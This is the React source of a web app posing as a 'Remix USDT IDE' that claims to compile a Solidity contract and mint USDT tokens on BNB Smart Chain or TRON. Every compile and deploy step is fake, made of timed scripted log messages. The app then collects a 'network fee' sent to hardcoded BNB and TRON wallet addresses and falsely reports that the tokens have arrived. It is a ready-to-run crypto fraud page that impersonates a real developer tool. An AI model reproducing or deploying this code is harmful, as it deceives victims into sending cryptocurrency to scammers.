/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';
import { 
  FileCode, 
  Search, 
  Play, 
  ShieldCheck, 
  Settings, 
  ChevronDown, 
  Terminal, 
  X, 
  CheckCircle2, 
  Wallet, 
  Copy,
  AlertCircle,
  Cpu,
  Network,
  Plus,
  FilePlus,
  Code2,
  Zap,
  Activity,
  Globe,
  Loader2
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

// Types
type Blockchain = 'BNB' | 'TRON';
type AppStep = 'IDLE' | 'COMPILING' | 'COMPILED' | 'DEPLOY_INIT' | 'VALUE_INPUT' | 'DEPLOY_FINALIZING' | 'PAYMENT' | 'DEPLOY_BROADCASTING' | 'SUCCESS';

const TRON_ADDRESS = "TJQDVAsz7oRMsmbNsjuiva9LV77cwummqi";
const BNB_ADDRESS = "0x2aefafad64d8722937f4c7b6edb3dbf91904e5b3";

const DEFAULT_CODE = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract USDT {
    string public name = "USDT";
    string public symbol = "USDT";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    address public owner = 0x________________________________________; // Enter your wallet address here

    mapping(address => uint256) public balanceOf;

    constructor(uint256 _initialSupply) {
        totalSupply = _initialSupply * 10**uint256(decimals);
        balanceOf[owner] = totalSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        return true;
    }
}`;

export default function App() {
  const [blockchain, setBlockchain] = useState<Blockchain>('BNB');
  const [step, setStep] = useState<AppStep>('IDLE');
  const [files, setFiles] = useState<{name: string, content: string}[]>([]);
  const [activeFileIndex, setActiveFileIndex] = useState<number | null>(null);
  const [showNewFileModal, setShowNewFileModal] = useState(false);
  const [newFileName, setNewFileName] = useState('');
  const [value, setValue] = useState<string>('10000');
  const [loadingText, setLoadingText] = useState<string>('');
  const [terminalLogs, setTerminalLogs] = useState<string[]>(["[info] Welcome to Remix USDT IDE v0.1.0"]);
  const [activeTab, setActiveTab] = useState<'explorer' | 'compiler' | 'deploy'>('explorer');

  const addLog = (msg: string) => {
    setTerminalLogs(prev => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);
  };

  const handleCreateFile = () => {
    if (!newFileName) return;
    const name = newFileName.endsWith('.sol') ? newFileName : `${newFileName}.sol`;
    const newFile = { name, content: '' };
    setFiles([...files, newFile]);
    setActiveFileIndex(files.length);
    setShowNewFileModal(false);
    setNewFileName('');
    addLog(`Created empty file: ${name}`);
  };

  const handleFileContentChange = (newContent: string) => {
    if (activeFileIndex === null) return;
    const updatedFiles = [...files];
    updatedFiles[activeFileIndex].content = newContent;
    setFiles(updatedFiles);
  };

  const handleCompile = () => {
    if (activeFileIndex === null) return;
    setStep('COMPILING');
    runLoadingSequence([
      "Initializing compiler...",
      "Parsing Solidity source...",
      "Resolving dependencies...",
      "Optimizing bytecode...",
      "Generating ABI..."
    ], () => {
      setStep('COMPILED');
      addLog("Compilation successful.");
      setActiveTab('deploy');
    });
  };

  const handleDeployInit = () => {
    setStep('DEPLOY_INIT');
    runLoadingSequence([
      "Connecting to Remix IDE...",
      "Connecting to Blockchain...",
      "Fetching network data...",
      "Preparing deployment transaction..."
    ], () => setStep('VALUE_INPUT'));
  };

  const handleValueSubmit = () => {
    setStep('DEPLOY_FINALIZING');
    runLoadingSequence([
      "Calculating gas fees...",
      "Estimating network congestion...",
      "Awaiting wallet signature..."
    ], () => setStep('PAYMENT'));
  };

  const handlePaymentConfirm = () => {
    setStep('DEPLOY_BROADCASTING');
    runLoadingSequence([
      "Verifying payment confirmation...",
      "Broadcasting transaction to mempool...",
      "Waiting for block confirmation...",
      "Generating USDT tokens...",
      "Finalizing smart contract deployment..."
    ], () => setStep('SUCCESS'));
  };

  const runLoadingSequence = (texts: string[], onComplete: () => void) => {
    let i = 0;
    const interval = setInterval(() => {
      if (i < texts.length) {
        setLoadingText(texts[i]);
        addLog(texts[i]);
        i++;
      } else {
        clearInterval(interval);
        onComplete();
      }
    }, 1200);
  };

  const calculateFee = () => {
    const numValue = parseInt(value) || 10000;
    const baseValue = 10000;
    if (blockchain === 'BNB') {
      const baseFee = 0.055;
      const ratio = numValue / baseValue;
      return (baseFee * Math.pow(ratio, 0.97)).toFixed(3);
    } else {
      const baseFee = 160;
      const ratio = numValue / baseValue;
      return Math.round(baseFee * Math.pow(ratio, 0.97)).toString();
    }
  };

  return (
    <div className="flex h-screen w-full bg-[#1a1a1a] text-[#d1d1d1] font-sans overflow-hidden flex-col">
      {/* Top Header - Network Switching */}
      <div className="h-12 bg-[#222222] border-b border-[#2a2a2a] flex items-center px-4 justify-between shrink-0 z-20">
        <div className="flex items-center space-x-3">
          <div className="w-8 h-8 bg-orange-500 rounded flex items-center justify-center">
            <Zap className="w-5 h-5 text-white fill-current" />
          </div>
          <span className="font-bold text-white tracking-tight hidden sm:inline">REMIX <span className="text-orange-500">USDT</span></span>
        </div>
        
        <div className="flex items-center bg-[#1a1a1a] rounded-lg p-1 border border-[#333]">
          <button 
            onClick={() => setBlockchain('BNB')}
            className={`px-4 py-1.5 rounded-md text-xs font-bold transition-all flex items-center space-x-2 ${blockchain === 'BNB' ? 'bg-yellow-500 text-black shadow-lg' : 'text-[#8a8a8a] hover:text-white'}`}
          >
            <Globe className="w-3 h-3" />
            <span>BNB SMART CHAIN</span>
          </button>
          <button 
            onClick={() => setBlockchain('TRON')}
            className={`px-4 py-1.5 rounded-md text-xs font-bold transition-all flex items-center space-x-2 ${blockchain === 'TRON' ? 'bg-red-600 text-white shadow-lg' : 'text-[#8a8a8a] hover:text-white'}`}
          >
            <Activity className="w-3 h-3" />
            <span>TRON NETWORK</span>
          </button>
        </div>

        <div className="flex items-center space-x-2">
          <div className="hidden md:flex items-center space-x-2 px-3 py-1 rounded bg-green-500/10 border border-green-500/20">
            <div className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse" />
            <span className="text-[10px] font-bold text-green-500 uppercase">Connected</span>
          </div>
          <Settings className="w-4 h-4 text-[#8a8a8a] cursor-pointer hover:text-white" />
        </div>
      </div>

      <div className="flex flex-grow overflow-hidden">
        {/* Sidebar - Icons */}
        <div className="w-12 flex flex-col items-center py-4 border-r border-[#2a2a2a] bg-[#222222] space-y-6 shrink-0">
          <FileCode 
            className={`w-6 h-6 cursor-pointer transition-colors ${activeTab === 'explorer' ? 'text-white' : 'text-[#8a8a8a] hover:text-white'}`} 
            onClick={() => setActiveTab('explorer')}
          />
          <Code2 
            className={`w-6 h-6 cursor-pointer transition-colors ${activeTab === 'compiler' ? 'text-white' : 'text-[#8a8a8a] hover:text-white'}`} 
            onClick={() => setActiveTab('compiler')}
          />
          <Play 
            className={`w-6 h-6 cursor-pointer transition-colors ${activeTab === 'deploy' ? 'text-white' : 'text-[#8a8a8a] hover:text-white'}`} 
            onClick={() => setActiveTab('deploy')}
          />
          <div className="flex-grow" />
          <ShieldCheck className="w-6 h-6 text-[#8a8a8a] cursor-pointer hover:text-white" />
        </div>

        {/* Left Panel - Dynamic Content */}
        <div className="w-64 md:w-72 bg-[#222222] border-r border-[#2a2a2a] flex flex-col shrink-0 overflow-y-auto">
          {activeTab === 'explorer' && (
            <div className="flex flex-col h-full">
              <div className="p-4 flex justify-between items-center">
                <span className="text-xs font-bold uppercase tracking-widest text-[#8a8a8a]">File Explorer</span>
                <Plus 
                  className="w-4 h-4 text-[#8a8a8a] cursor-pointer hover:text-white" 
                  onClick={() => setShowNewFileModal(true)}
                />
              </div>
              <div className="flex flex-col">
                <div className="flex items-center px-4 py-2 hover:bg-[#2a2a2a] cursor-pointer group">
                  <ChevronDown className="w-4 h-4 mr-2 text-[#8a8a8a]" />
                  <span className="text-sm font-medium">contracts</span>
                </div>
                {files.map((file, idx) => (
                  <div 
                    key={idx}
                    onClick={() => setActiveFileIndex(idx)}
                    className={`flex items-center px-10 py-2 cursor-pointer transition-colors ${activeFileIndex === idx ? 'bg-[#2a2a2a] text-white' : 'text-[#8a8a8a] hover:bg-[#2a2a2a] hover:text-white'}`}
                  >
                    <FileCode className="w-4 h-4 mr-2 text-orange-400" />
                    <span className="text-sm truncate">{file.name}</span>
                  </div>
                ))}
                {files.length === 0 && (
                  <div 
                    onClick={() => setShowNewFileModal(true)}
                    className="mx-4 mt-2 p-4 border border-dashed border-[#333] rounded-lg text-center cursor-pointer hover:border-[#555] transition-all"
                  >
                    <FilePlus className="w-6 h-6 mx-auto mb-2 text-[#555]" />
                    <span className="text-xs text-[#555]">Create new .sol file</span>
                  </div>
                )}
              </div>
            </div>
          )}

          {activeTab === 'compiler' && (
            <div className="p-4 space-y-6">
              <span className="text-xs font-bold uppercase tracking-widest text-[#8a8a8a]">Solidity Compiler</span>
              <div className="space-y-4">
                <div className="space-y-2">
                  <label className="text-[10px] font-bold text-[#555] uppercase">Compiler Version</label>
                  <div className="bg-[#1a1a1a] p-2 rounded border border-[#333] text-xs text-white flex justify-between items-center">
                    0.8.26+commit.8a97fa7a
                    <ChevronDown className="w-3 h-3 text-[#555]" />
                  </div>
                </div>
                <button 
                  onClick={handleCompile}
                  disabled={activeFileIndex === null || step === 'COMPILING'}
                  className="w-full py-2.5 bg-[#3366ff] hover:bg-[#2a52cc] disabled:bg-[#2a2a2a] disabled:text-[#555] text-white rounded font-bold text-sm transition-all flex items-center justify-center space-x-2"
                >
                  {step === 'COMPILING' ? <Loader2 className="w-4 h-4 animate-spin" /> : <Cpu className="w-4 h-4" />}
                  <span>Compile {activeFileIndex !== null ? files[activeFileIndex].name : 'Contract'}</span>
                </button>
              </div>
            </div>
          )}

          {activeTab === 'deploy' && (
            <div className="p-4 space-y-6">
              <span className="text-xs font-bold uppercase tracking-widest text-[#8a8a8a]">Deploy & Run</span>
              <div className="space-y-4">
                <div className="p-3 bg-blue-500/5 border border-blue-500/20 rounded-lg space-y-2">
                  <div className="flex items-center text-[10px] font-bold text-blue-400 uppercase">
                    <AlertCircle className="w-3 h-3 mr-1" />
                    Network Info
                  </div>
                  <p className="text-[11px] text-[#8a8a8a]">You are deploying on {blockchain} Mainnet. Ensure your wallet has sufficient funds for gas fees.</p>
                </div>

                <div className="space-y-2">
                  <label className="text-[10px] font-bold text-[#555] uppercase">Contract to Deploy</label>
                  <div className="bg-[#1a1a1a] p-2 rounded border border-[#333] text-xs text-white truncate">
                    {step === 'COMPILED' || step === 'SUCCESS' ? 'USDT - contracts/USDT.sol' : 'No compiled contract'}
                  </div>
                </div>

                <button 
                  onClick={handleDeployInit}
                  disabled={step !== 'COMPILED'}
                  className="w-full py-3 bg-[#3366ff] hover:bg-[#2a52cc] disabled:bg-[#2a2a2a] disabled:text-[#555] text-white rounded font-bold text-sm transition-all flex items-center justify-center space-x-2"
                >
                  <Zap className="w-4 h-4" />
                  <span>Deploy Contract</span>
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Main Editor Area */}
        <div className="flex-grow flex flex-col min-w-0">
          {/* Tabs */}
          <div className="h-9 bg-[#222222] flex items-center border-b border-[#2a2a2a]">
            {activeFileIndex !== null && (
              <div className="h-full px-4 flex items-center bg-[#1a1a1a] border-r border-[#2a2a2a] text-sm text-white">
                <FileCode className="w-4 h-4 mr-2 text-orange-400" />
                {files[activeFileIndex].name}
                <X 
                  className="w-3 h-3 ml-4 text-[#8a8a8a] hover:text-white cursor-pointer" 
                  onClick={() => setActiveFileIndex(null)}
                />
              </div>
            )}
          </div>

          {/* Editor */}
          <div className="flex-grow bg-[#1a1a1a] flex font-mono text-sm overflow-hidden relative">
            {activeFileIndex !== null ? (
              <>
                <div className="w-10 text-[#444] text-right pr-4 select-none border-r border-[#222] mr-4 pt-4 shrink-0">
                  {Array.from({ length: 50 }).map((_, i) => (
                    <div key={i}>{i + 1}</div>
                  ))}
                </div>
                <textarea
                  value={files[activeFileIndex].content}
                  onChange={(e) => handleFileContentChange(e.target.value)}
                  className="flex-grow bg-transparent text-[#d1d1d1] p-4 focus:outline-none resize-none leading-relaxed h-full w-full"
                  placeholder="// Paste your Solidity code here..."
                  spellCheck={false}
                />
              </>
            ) : (
              <div className="h-full w-full flex flex-col items-center justify-center text-[#444] space-y-4">
                <Zap className="w-16 h-16 opacity-10" />
                <p className="text-sm font-medium">Select or create a file to start coding</p>
              </div>
            )}
          </div>

          {/* Terminal */}
          <div className="h-48 bg-[#1a1a1a] border-t border-[#2a2a2a] flex flex-col shrink-0">
            <div className="h-8 bg-[#222222] px-4 flex items-center justify-between">
              <div className="flex items-center text-[10px] font-bold uppercase tracking-widest text-[#8a8a8a]">
                <Terminal className="w-3 h-3 mr-2" />
                Output Console
              </div>
            </div>
            <div className="flex-grow p-4 font-mono text-[11px] text-[#8a8a8a] overflow-auto space-y-1">
              {terminalLogs.map((log, i) => (
                <div key={i} className={log.includes('successful') ? 'text-green-500' : ''}>{log}</div>
              ))}
              <div ref={(el) => el?.scrollIntoView({ behavior: 'smooth' })} />
            </div>
          </div>
        </div>
      </div>

      {/* Modals & Overlays */}
      <AnimatePresence>
        {showNewFileModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-[#222222] w-full max-w-sm rounded-xl border border-[#333] p-6 space-y-6 shadow-2xl"
            >
              <h3 className="text-lg font-bold text-white">Create New File</h3>
              <div className="space-y-2">
                <label className="text-[10px] font-bold text-[#8a8a8a] uppercase">File Name</label>
                <input 
                  autoFocus
                  type="text" 
                  value={newFileName}
                  onChange={(e) => setNewFileName(e.target.value)}
                  className="w-full bg-[#1a1a1a] border border-[#333] rounded-lg p-3 text-white focus:outline-none focus:border-[#3366ff]"
                  placeholder="Contract.sol"
                  onKeyDown={(e) => e.key === 'Enter' && handleCreateFile()}
                />
              </div>
              <div className="flex space-x-3">
                <button 
                  onClick={() => setShowNewFileModal(false)}
                  className="flex-1 py-2.5 bg-[#2a2a2a] text-white rounded-lg font-bold text-sm hover:bg-[#333]"
                >
                  Cancel
                </button>
                <button 
                  onClick={handleCreateFile}
                  className="flex-1 py-2.5 bg-[#3366ff] text-white rounded-lg font-bold text-sm hover:bg-[#2a52cc]"
                >
                  Create
                </button>
              </div>
            </motion.div>
          </div>
        )}

        {(step === 'COMPILING' || step.includes('DEPLOY_') || step === 'DEPLOY_BROADCASTING') && step !== 'VALUE_INPUT' && step !== 'PAYMENT' && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-md p-4">
            <div className="text-center space-y-8 max-w-sm w-full">
              <div className="relative flex justify-center">
                <motion.div 
                  animate={{ rotate: 360 }}
                  transition={{ duration: 2, repeat: Infinity, ease: "linear" }}
                  className="w-24 h-24 border-4 border-[#3366ff]/20 border-t-[#3366ff] rounded-full"
                />
                <div className="absolute inset-0 flex items-center justify-center">
                  {step === 'COMPILING' ? <Cpu className="w-8 h-8 text-[#3366ff]" /> : <Network className="w-8 h-8 text-[#3366ff]" />}
                </div>
              </div>
              <div className="space-y-2">
                <motion.h3 
                  key={loadingText}
                  initial={{ y: 10, opacity: 0 }}
                  animate={{ y: 0, opacity: 1 }}
                  className="text-xl font-medium text-white"
                >
                  {loadingText}
                </motion.h3>
                <p className="text-[#8a8a8a] text-sm">Processing transaction on {blockchain}...</p>
              </div>
            </div>
          </div>
        )}

        {step === 'VALUE_INPUT' && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              className="bg-[#222222] w-full max-w-md rounded-xl border border-[#333] p-8 space-y-6 shadow-2xl"
            >
              <div className="text-center space-y-2">
                <h3 className="text-2xl font-bold text-white">USDT Generation</h3>
                <p className="text-[#8a8a8a] text-sm">Specify the amount of USDT to mint upon deployment.</p>
              </div>
              <div className="space-y-2">
                <label className="text-[10px] font-bold text-[#8a8a8a] uppercase">Amount (Min 10k)</label>
                <input 
                  type="number" 
                  value={value}
                  onChange={(e) => setValue(e.target.value)}
                  min="10000"
                  className="w-full bg-[#1a1a1a] border border-[#333] rounded-lg p-4 text-white text-xl font-bold focus:outline-none focus:border-[#3366ff]"
                />
              </div>
              <button 
                onClick={handleValueSubmit}
                className="w-full py-4 bg-[#3366ff] hover:bg-[#2a52cc] text-white rounded-xl font-bold text-lg transition-all"
              >
                Continue to Payment
              </button>
            </motion.div>
          </div>
        )}

        {step === 'PAYMENT' && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 overflow-y-auto">
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              className="bg-[#222222] w-full max-w-lg rounded-2xl border border-[#333] overflow-hidden shadow-2xl my-8"
            >
              <div className="p-8 space-y-8">
                <div className="text-center space-y-2">
                  <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-yellow-500/10 text-yellow-500 mb-4">
                    <Wallet className="w-8 h-8" />
                  </div>
                  <h3 className="text-2xl font-bold text-white">Network Fee Required</h3>
                  <p className="text-[#8a8a8a] text-sm">A small network fee is required to broadcast your smart contract to the {blockchain} mainnet.</p>
                </div>

                <div className="bg-[#1a1a1a] rounded-xl p-6 border border-[#333] space-y-6">
                  <div className="flex justify-between items-center">
                    <span className="text-[#8a8a8a] font-medium">Fee Amount:</span>
                    <span className="text-2xl font-bold text-white">{calculateFee()} {blockchain === 'BNB' ? 'BNB' : 'TRX'}</span>
                  </div>
                  
                  <div className="space-y-3">
                    <label className="text-[10px] font-bold text-[#8a8a8a] uppercase">Deposit Address</label>
                    <div className="flex items-center space-x-2">
                      <div className="flex-grow bg-[#222222] p-3 rounded-lg text-[10px] font-mono text-white break-all border border-[#333]">
                        {blockchain === 'BNB' ? BNB_ADDRESS : TRON_ADDRESS}
                      </div>
                      <button 
                        onClick={() => navigator.clipboard.writeText(blockchain === 'BNB' ? BNB_ADDRESS : TRON_ADDRESS)}
                        className="p-3 bg-[#3366ff] hover:bg-[#2a52cc] rounded-lg text-white transition-all"
                      >
                        <Copy className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                  
                  <div className="flex justify-center">
                    <div className="w-44 h-44 bg-white p-3 rounded-xl">
                      <img 
                        src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${blockchain === 'BNB' ? BNB_ADDRESS : TRON_ADDRESS}`} 
                        alt="QR Code"
                        className="w-full h-full"
                        referrerPolicy="no-referrer"
                      />
                    </div>
                  </div>
                </div>

                <button 
                  onClick={handlePaymentConfirm}
                  className="w-full py-4 bg-[#3366ff] hover:bg-[#2a52cc] text-white rounded-xl font-bold text-lg shadow-lg shadow-[#3366ff]/20 transition-all"
                >
                  I made it
                </button>
              </div>
            </motion.div>
          </div>
        )}

        {step === 'SUCCESS' && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-md p-4">
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              className="bg-[#222222] w-full max-w-md rounded-2xl border border-green-500/30 p-8 text-center space-y-6 shadow-2xl"
            >
              <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-green-500/10 text-green-500 mb-2">
                <CheckCircle2 className="w-10 h-10" />
              </div>
              <div className="space-y-2">
                <h3 className="text-2xl font-bold text-white">Deployment Live!</h3>
                <p className="text-[#8a8a8a] text-sm">Alright, everything is done. Your code is deployed live on Remix for now.</p>
              </div>
              <div className="bg-green-500/5 p-4 rounded-xl border border-green-500/20 text-sm text-green-400 font-bold">
                Please check your wallet. You received your generated tokens.
              </div>
              <button 
                onClick={() => { setStep('IDLE'); setActiveTab('explorer'); }}
                className="w-full py-4 bg-green-600 hover:bg-green-700 text-white rounded-xl font-bold transition-all"
              >
                Return to Workspace
              </button>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
